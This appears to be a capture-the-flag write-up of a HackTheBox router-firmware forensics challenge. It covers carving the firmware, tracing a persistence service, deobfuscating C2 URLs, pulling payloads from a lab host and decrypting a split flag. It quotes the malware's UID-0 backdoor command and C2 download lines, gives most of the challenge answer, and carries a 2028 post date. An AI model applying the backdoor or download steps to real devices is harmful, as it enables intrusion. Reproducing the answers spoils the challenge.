---
layout: post
title: "ZombieNet"
date: 2028-03-11 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, openwrt, firmware, squashfs, reverse-engineering, xor, rc4, malware]
description: "A decommissioned OpenWRT router still phoning home. Carve the firmware, reverse a MIPS downloader whose C2 URLs are hidden behind a repeating-XOR key, then reassemble a flag split across two C2 payloads — half a base64 cookie, half an RC4 blob whose key is a hash hiding in plain sight."
---

## Overview

ZombieNet is a Medium forensics challenge built around a Xiaomi Mi Router 4A firmware image. The router was "decommissioned" after an attack, but the attacker left persistence behind. The task is to extract the firmware, find how the "Zombies" maintain access, and recover a flag that has been deliberately split across two command-and-control payloads.

## The technique

OpenWRT persistence lives in procd services under `/etc/init.d`. The malware chain here is a classic multi-stage downloader, with two twists that keep `strings` from ever revealing the flag: the second-stage C2 URLs are obfuscated with a 32-byte repeating-XOR key, and the flag itself is split — one half arrives base64-encoded in an HTTP cookie, the other half is [RC4](https://cwe.mitre.org/data/definitions/327.html)-encrypted inside a second-stage binary whose key is disguised as a 40-character hash.

## Solution

### 1. Carve the firmware

The `.bin` is a u-boot uImage (MIPS) with a SquashFs appended at the offset `binwalk` reports. Carve it and unpack:

```bash
binwalk openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin
dd if=firmware.bin of=root.squashfs bs=4 skip=$((0x2B752C/4))
unsquashfs -d squashfs-root root.squashfs
```

### 2. Find the persistence

OpenWRT persistence is a procd service — a chain from `/etc/init.d` to a runner script to a binary:

```bash
cat squashfs-root/etc/init.d/dead-reanimation   # procd: PROG=/sbin/zombie_runner
cat squashfs-root/sbin/zombie_runner            # loops /usr/bin/dead-reanimation every 600s
file squashfs-root/usr/bin/dead-reanimation     # ELF 32-bit MIPS, libcurl + system downloader
```

### 3. Deobfuscate the C2 URLs (repeating-XOR)

The downloader hides its strings with a 32-byte repeating XOR key (`key[i % 32]`) sitting in `.rodata`. XOR the encoded blobs to recover the C2:

```
/tmp/dead_reanimated      /tmp/reanimate.sh
http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00
http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00
```

### 4. Query the emulated C2

The challenge ships a Docker instance emulating `configs.router.htb`. Point the hostname at the Docker IP with a `Host` header and pull each payload:

```bash
curl -H "Host: configs.router.htb" http://<docker-ip>:<port>/reanimate.sh_jEzOWMtZTUxOS00
curl -H "Host: configs.router.htb" http://<docker-ip>:<port>/dead_reanimated_mNmZTMtNjU3YS00 -o dead_reanimated
```

`reanimate.sh` carries a cookie whose value base64-decodes to the **first half** of the flag:

```bash
echo 'SFRCe1owbWIxM3NfaDR2M19pbmY' | base64 -d   # HTB{Z0mb13s_h4v3_inf
```

The second-stage `dead_reanimated` binary (not stripped) creates a duplicate [UID-0 backdoor account](https://cwe.mitre.org/data/definitions/506.html) (`useradd -o -u 0 zombie_lord`) and contains an RC4 library plus a 40-character hex string.

### 5. RC4-decrypt the second half

The trap: the RC4 **key** is the ASCII hex string used **verbatim** — not hex-decoded. The ciphertext is 27 raw bytes.

Create `solve.py`:

```python
def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) & 0xff; j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xff])
    return bytes(out)

cipher  = bytes.fromhex("c57c2b054890f3b73f760f5b687b6272bdf8019b57471e6fdf8c55")
key_str = b"d2c0ba035fe58753c648066d76fa793bea92ef29"   # ASCII, not hex-decoded
print(rc4(key_str, cipher))   # b'3ct3d_0ur_c0mmun1c4t10ns!!}'
```

Join the halves — `inf` + `3ct3d` reads "infected":

```
HTB{...}
```

## Why it worked

The flag was split so that no single `strings`/`grep` over the firmware could reveal it. You have to reverse the downloader, deobfuscate its XOR-hidden URLs, retrieve both payloads from the emulated C2, and reverse the second-stage crypto. The final trick — a hash-looking hex string used as the literal RC4 key rather than being hex-decoded — is a recurring trap in malware and CTF crypto: always try a key both as its literal ASCII bytes and as the hex-decoded value.

## Fix / defense

- Sign firmware and verify on boot; alert on unexpected `/etc/init.d` procd services and new binaries under `/sbin` and `/usr/bin`.
- Alert on any `useradd` with `-o -u 0` and on `/etc/passwd` entries with UID 0 other than `root` — a duplicate UID-0 account is the persistence here.
- Egress-filter the router management plane and DNS-monitor for internal C2 vhosts such as `configs.` / `callback.<domain>`.
